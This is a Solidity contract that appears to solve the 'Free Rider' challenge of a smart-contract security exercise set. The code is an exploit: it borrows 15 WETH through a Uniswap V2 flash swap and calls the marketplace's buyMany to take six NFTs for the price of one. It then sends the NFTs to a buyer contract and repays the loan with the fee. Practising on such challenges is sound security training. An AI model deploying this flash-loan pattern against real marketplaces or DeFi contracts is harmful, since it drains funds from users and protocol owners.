// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IWETH {
    function transfer(address recipient, uint256 amount) external returns (bool);

    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract FreeRiderAttacker is IERC721Receiver, IUniswapV2Callee {
    IERC721 private immutable nft;
    address private immutable buyerContract;
    address payable private immutable marketplaceAddress;
    uint256[] private ids;
    IUniswapV2Pair private immutable uniswapPair;
    IWETH private immutable weth;

    constructor(
        address _nftAddress,
        address _buyerContract,
        address payable _marketplaceAddress,
        uint256[] memory _ids,
        IUniswapV2Pair _uniswapPair,
        IWETH _weth
    ) {
        nft = IERC721(_nftAddress);
        buyerContract = _buyerContract;
        marketplaceAddress = _marketplaceAddress;
        ids = _ids;
        uniswapPair = _uniswapPair;
        weth = _weth;
    }

    function attack() external {
        uniswapPair.swap(15 ether, 0, address(this), hex"00");
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external override {
        weth.withdraw(15 ether);

        FreeRiderNFTMarketplace(marketplaceAddress).buyMany{ value: 15 ether }(ids);
        for (uint8 tokenId = 0; tokenId < 6; tokenId++) {
            nft.safeTransferFrom(address(this), buyerContract, tokenId);
        }

        // Calculate fee and pay back loan.
        uint256 fee = ((15 ether * 3) / uint256(997)) + 1;
        weth.deposit{ value: 15 ether + fee }();
        weth.transfer(address(uniswapPair), 15 ether + fee);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
